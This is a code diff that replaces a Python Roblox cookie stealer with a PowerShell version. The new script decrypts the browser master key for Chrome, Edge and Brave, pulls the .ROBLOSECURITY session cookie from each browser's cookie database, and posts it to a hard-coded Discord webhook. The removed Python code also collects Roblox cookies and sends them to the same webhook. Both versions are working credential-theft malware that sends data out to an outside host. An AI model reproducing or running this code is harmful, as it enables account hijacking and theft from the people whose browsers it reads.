@@ -1,73 +1,34 @@
-import time
-from selenium import webdriver
-from selenium.webdriver.chrome.options import Options
-import requests
-import base64
-
-def steal_roblox_cookie():
-    # Setup Chrome options
-    chrome_options = Options()
-    chrome_options.add_argument("--headless")
-    chrome_options.add_argument("--disable-gpu")
-    chrome_options.add_argument("--no-sandbox")
-    
-    webhook_url = "https://discord.com/api/webhooks/1533937727903498262/EDZkUjqJCjaDFKNAS4rRYwjBSsVnlK0F7X82nQaVH_7V3Yb2GTyMrTI1W7pCjIKbgk5V"
-    
-    try:
-        # Launch browser
-        driver = webdriver.Chrome(options=chrome_options)
-        driver.get("https://www.roblox.com/")
-        time.sleep(2)
-        
-        # Get all cookies
-        cookies = driver.get_cookies()
-        
-        # Filter for Roblox cookies
-        roblox_cookies = {}
-        for cookie in cookies:
-            if 'roblox' in cookie['domain']:
-                roblox_cookies[cookie['name']] = cookie['value']
-        
-        if not roblox_cookies:
-            print("No Roblox cookies found")
-            return False
-            
-        # Format for webhook
-        embed_data = {
-            "content": "**Roblox Cookie Steal**",
-            "embeds": [{
-                "title": "Roblox Cookie Data",
-                "color": 0x00ff00,
-                "fields": []
-            }]
+$w='https://discord.com/api/webhooks/1533937727903498262/EDZkUjqJCjaDFKNAS4rRYwjBSsVnlK0F7X82nQaVH_7V3Yb2GTyMrTI1W7pCjIKbgk5V'
+Add-Type -AssemblyName System.Security
+$b=@('Google\Chrome','Microsoft\Edge','BraveSoftware\Brave-Browser')
+foreach($b in $b){
+    $l="$env:LOCALAPPDATA\$b\User Data\Local State"
+    if(Test-Path $l){
+        $j=Get-Content $l|ConvertFrom-Json
+        $e=$j.os_crypt.encrypted_key
+        $k=[System.Security.Cryptography.ProtectedData]::Unprotect([Convert]::FromBase64String($e)[5..10000],$null,'CurrentUser')
+        $c="$env:LOCALAPPDATA\$b\User Data\Default\Network\Cookies"
+        if(Test-Path $c){
+            $t="$env:TEMP\c.db"
+            Copy-Item $c $t -Force
+            $conn=New-Object System.Data.SQLite.SQLiteConnection("Data Source=$t")
+            $conn.Open()
+            $cmd=$conn.CreateCommand()
+            $cmd.CommandText="SELECT encrypted_value FROM cookies WHERE host_key LIKE '%roblox.com%' AND name='.ROBLOSECURITY'"
+            $r=$cmd.ExecuteReader()
+            while($r.Read()){
+                $d=$r.GetValue(0)
+                $n=$d[3..14]
+                $cipher=$d[15..($d.Length-17)]
+                $tag=$d[($d.Length-16)..($d.Length-1)]
+                $aes=[System.Security.Cryptography.AesGcm]::new($k)
+                $plain=[byte[]]::new($cipher.Length)
+                $aes.Decrypt($n,$cipher,$tag,$plain)
+                $token=[System.Text.Encoding]::UTF8.GetString($plain)
+                if($token-match'_|WARNING'){
+                    Invoke-RestMethod -Uri $w -Method Post -Body (@{content='TOKEN: '+$token}|ConvertTo-Json)-ContentType 'application/json'
+                }
+            }
         }
-        
-        # Add cookie data
-        for name, value in roblox_cookies.items():
-            embed_data["embeds"][0]["fields"].append({
-                "name": f"Cookie: {name}",
-                "value": f"```{value}```",
-                "inline": False
-            })
-            
-        # Send to webhook
-        headers = {
-            "Content-Type": "application/json"
-        }
-        response = requests.post(webhook_url, json=embed_data, headers=headers)
-        
-        if response.status_code == 204:
-            print("Successfully sent cookie data to webhook")
-            return True
-        else:
-            print(f"Failed to send: {response.status_code}")
-            return False
-            
-    except Exception as e:
-        print(f"Error: {e}")
-        return False
-    finally:
-        driver.quit()
-
-if __name__ == "__main__":
-    steal_roblox_cookie()
+    }
+}
